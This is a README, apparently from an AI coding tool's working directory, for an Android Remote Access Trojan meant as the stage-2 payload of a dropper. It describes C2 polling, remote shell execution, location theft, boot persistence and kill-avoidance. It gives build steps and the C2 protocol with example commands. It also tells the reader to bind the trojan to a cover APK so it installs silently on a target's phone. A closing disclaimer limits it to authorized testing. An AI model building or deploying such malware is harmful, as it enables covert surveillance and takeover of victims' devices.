// C:\Users\User\AppData\Local\Temp\kilo\rat\README.md
# Android RAT (Stage-2 Payload)

This is a simple Remote Access Trojan (RAT) designed to be the stage-2 payload of the dropper. It connects to a Command and Control (C2) server, polls for commands, and executes them.

## Features
- HTTP-based C2 communication (polling)
- Shell command execution
- Location retrieval
- Persistence via boot receiver
- Foreground service to avoid being killed
- Basic command set extensible

## Permissions
The manifest includes a wide range of permissions for demonstration. In practice, only the necessary permissions should be included.

## Building
1. Install Android Studio and the Android SDK.
2. Clone or copy this directory to your machine.
3. Open the project in Android Studio.
4. Connect your Android device or use an emulator.
5. Click Run to build and install the APK.
6. Alternatively, use the command line:
   ```
   ./gradlew assembleDebug
   ```
   The APK will be in `app/build/outputs/apk/debug/app-debug.apk`.

## Configuration
- Change the `c2BaseUrl` in `RatService.kt` to point to your C2 server.
- The device ID is currently set to `Build.SERIAL`; consider changing to a more reliable identifier.
- Adjust the polling interval as needed.

## Usage with Dropper
1. Build this RAT APK (stage-2).
2. Use the dropper binder script to bind it with a cover APK.
3. Install the bound APK on the target device.
4. The dropper will request permissions, install the RAT silently, and launch the cover app.
5. The RAT will start communicating with the C2 server.

## C2 Server Expectations
The RAT expects a simple HTTP C2 server with two endpoints:
- `GET /poll?deviceId=<device_id>`: Returns a JSON array of command objects.
  Each command object should have:
  - `id`: string (unique identifier for the command)
  - `type`: string (e.g., "shell", "get_location")
  - Additional fields depending on the type (e.g., for "shell": `command`: string)
- `POST /result`: Accepts a JSON object with:
  - `deviceId`: string
  - `commandId`: string
  - `result`: string (output of the command)

Example command JSON array:
```json
[
  {
    "id": "cmd1",
    "type": "shell",
    "command": "ls -la"
  },
  {
    "id": "cmd2",
    "type": "get_location"
  }
]
```

## Disclaimer
This code is for authorized penetration testing only. Do not use on systems without explicit permission.